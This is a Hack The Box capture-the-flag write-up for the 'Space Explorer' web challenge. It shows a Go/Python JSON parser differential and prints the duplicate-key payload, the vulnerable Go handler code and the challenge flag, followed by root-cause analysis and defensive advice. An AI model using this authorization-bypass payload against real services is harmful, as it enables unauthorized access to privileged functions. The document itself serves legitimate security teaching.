---
title: "Space Explorer"
description: "Bypass authentication through a JSON parsing discrepancy between Go and Python to reach the secure-code action."
platform: "Hack The Box"
category: "Web"
difficulty: "Easy"
publishedAt: 2026-07-31
tags: ["web", "authentication-bypass", "json", "go", "python", "parser-differential"]
language: "en"
translationKey: "hack-the-box/space-explorer"
draft: false
featured: true
cover: "/images/space-explorer/space-explorer-04.png"
---

> This write-up was produced in a controlled lab environment. Only apply the techniques below to systems you are authorized to test.

## Overview

[Space Explorer](https://app.hackthebox.com/challenges/Space%20Explorer?tab=play_challenge) uses two services to process the same request:

- **Sender**, written in Go, validates the action.
- **Receiver**, written in Python, handles the request after Sender forwards it.

The services interpret JSON key names differently. This inconsistency lets us make Sender see an allowed action while Receiver sees a privileged one.

## Endpoint reconnaissance

The application sends a `POST` request to `/execute`. The ordinary `getcosmic` action returns information about an astronaut:

```http
POST /execute HTTP/1.1
Content-Type: application/json

{
  "action": "getcosmic"
}
```

![A valid getcosmic request and the server response](/images/space-explorer/space-explorer-01.png)

Calling `getSecureCode` directly is rejected by Sender:

```http
POST /execute HTTP/1.1
Content-Type: application/json

{
  "action": "getSecureCode"
}
```

```text
Access denied: Invalid security clearance
```

![The getSecureCode request is denied](/images/space-explorer/space-explorer-02.png)

## Source-code analysis

Inside `executeHandler`, Sender reads the raw body and unmarshals the JSON into `RequestData`:

```go
body, err := io.ReadAll(r.Body)
if err != nil {
    http.Error(w, "Failed to read request body", http.StatusBadRequest)
    return
}

var requestData RequestData
if err := json.Unmarshal(body, &requestData); err != nil {
    http.Error(w, "Invalid JSON", http.StatusBadRequest)
    return
}
```

The `Action` field maps to the JSON key `action`:

```go
type RequestData struct {
    Action string `json:"action"`
}
```

The program then checks the parsed value:

```go
switch requestData.Action {
case "getcosmic":
    resp, err := http.Post(
        "http://localhost:8081/execute",
        "application/json",
        bytes.NewBuffer(body),
    )
    // ...
case "getSecureCode":
    w.Write([]byte("Access denied: Invalid security clearance"))
default:
    http.Error(w, "Invalid command", http.StatusBadRequest)
}
```

![The executeHandler source code in the Go service](/images/space-explorer/space-explorer-03.png)

Two behaviors matter here:

1. Go's `encoding/json` prefers an exact key match but also accepts case-insensitive matches. When multiple keys map to the same field, the later value overwrites the earlier one.
2. After validation, Sender does not serialize `requestData`; it forwards the **original request body** to Receiver through `bytes.NewBuffer(body)`.

Python dictionaries treat key names as case-sensitive, so `action` and `Action` remain separate keys in Receiver.

## Exploiting the JSON parser differential

Send two keys that differ only in the capitalization of the first letter:

```json
{
  "action": "getSecureCode",
  "Action": "getcosmic"
}
```

Their order is essential:

- Go maps both keys to `requestData.Action`. Because `Action` appears last, the final value is `getcosmic`, which passes the `switch` check.
- Sender forwards the unmodified JSON rather than normalized data.
- Python distinguishes the two keys and reads `action` as `getSecureCode`, executing the branch that returns the secure code.

The response contains the flag:

```text
HTB{C0SM1C-BYP4SS}
```

![Successful exploitation returns the flag](/images/space-explorer/space-explorer-04.png)

Reversing the key order makes Go retain `getSecureCode` as the last value, so Sender blocks the request before it reaches Receiver.

## Root cause

The vulnerability is not merely a case-sensitivity mismatch. The complete failure is that:

- Two trusted components interpret the same input under different rules.
- Sender validates one representation but forwards another.
- The request is not normalized against one schema before crossing a trust boundary.

This is a **parser differential**, or **inconsistent interpretation**, and can cause authentication or authorization bypasses when services use different languages or parsing libraries.

## Defensive recommendations

- After parsing and validation, forward only the normalized object; never forward the client-supplied raw body.
- Enforce a strict schema and reject unknown keys, duplicate keys, and case-only variants.
- Authorize access in the service that owns the sensitive resource. Receiver must not assume a request is safe merely because Sender forwarded it.
- Apply the same canonicalization and validation rules across the service chain.
- Test duplicate keys, case variants, and payloads that different parsers may interpret differently.

## Conclusion

Space Explorer demonstrates a subtle but dangerous logic flaw in a multi-service architecture. Two keys, `action` and `Action`, create two interpretations of one request: Go sees `getcosmic` and permits forwarding, while Python sees `getSecureCode` and returns the flag.
